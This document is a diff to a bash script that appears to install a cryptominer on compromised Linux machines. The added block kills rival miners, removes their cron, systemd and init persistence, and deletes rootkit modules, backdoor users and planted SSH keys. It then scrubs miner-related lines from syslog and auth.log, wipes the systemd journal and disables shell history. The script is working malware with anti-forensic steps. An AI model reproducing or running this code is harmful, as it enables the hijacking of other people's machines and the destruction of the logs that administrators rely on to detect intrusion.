@@ -1,6 +1,57 @@
 #!/bin/bash
 
+# ==================== CLEAN PREVIOUS INSTALLATIONS ====================
+echo "[*] Cleaning previous installations..."
+
+# Stop all mining processes
+killall -9 xmrig kswapd0 swapd gdm2 moneroocean_miner 2>/dev/null
+
+# Remove crontab entries
+crontab -l | grep -v "system_cache\|check_and_start\|swapd\|gdm2" | crontab -
+
+# Remove systemd services
+sudo systemctl stop gdm2 swapd moneroocean_miner 2>/dev/null
+sudo systemctl disable gdm2 swapd moneroocean_miner 2>/dev/null
+sudo rm -f /etc/systemd/system/gdm2.service /etc/systemd/system/swapd.service /etc/systemd/system/moneroocean_miner.service 2>/dev/null
+sudo systemctl daemon-reload 2>/dev/null
+
+# Remove SysV init scripts
+sudo rm -f /etc/init.d/gdm2 /etc/init.d/swapd /etc/init.d/moneroocean_miner 2>/dev/null
+
+# Clean home directories
+rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache /tmp/xmrig*
+
+# Remove from profile
+sed -i '/\.system_cache\|\.swapd\|\.gdm\|moneroocean/d' ~/.profile ~/.bashrc ~/.bash_profile 2>/dev/null
+
+# Clean SSH keys if they exist
+if [ -f ~/.ssh/authorized_keys ] && grep -q "AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh" ~/.ssh/authorized_keys; then
+    sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh/d' ~/.ssh/authorized_keys
+fi
+
+# Clean root directories (if running as root)
+if [ "$(id -u)" -eq 0 ]; then
+    rm -rf /root/.swapd /root/.gdm* /root/.system_cache /root/.ssh/authorized_keys_backdoor 2>/dev/null
+    sed -i '/clamav-mail/d' /etc/passwd /etc/shadow /etc/sudoers.d/ 2>/dev/null
+    userdel -r clamav-mail 2>/dev/null
+    rm -f /etc/sudoers.d/clamav-mail 2>/dev/null
+fi
+
+# Remove kernel rootkits
+sudo rmmod diamorphine reptile rootkit 2>/dev/null
+sudo rm -rf /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine /tmp/.X11-unix/hiding-cryptominers-linux-rootkit 2>/dev/null
+
+# Clean logs
+sudo sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner\|accepted/d' /var/log/syslog /var/log/auth.log /var/log/messages 2>/dev/null
+sudo journalctl --vacuum-time=1s 2>/dev/null
+
+echo "[✓] Previous installations cleaned"
+sleep 2
+# ======================================================================
+
+# Continue with original script...
 unset HISTFILE
+# ... rest of the script
 #unset HISTFILE ;history -d $((HISTCMD-1))
 #export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
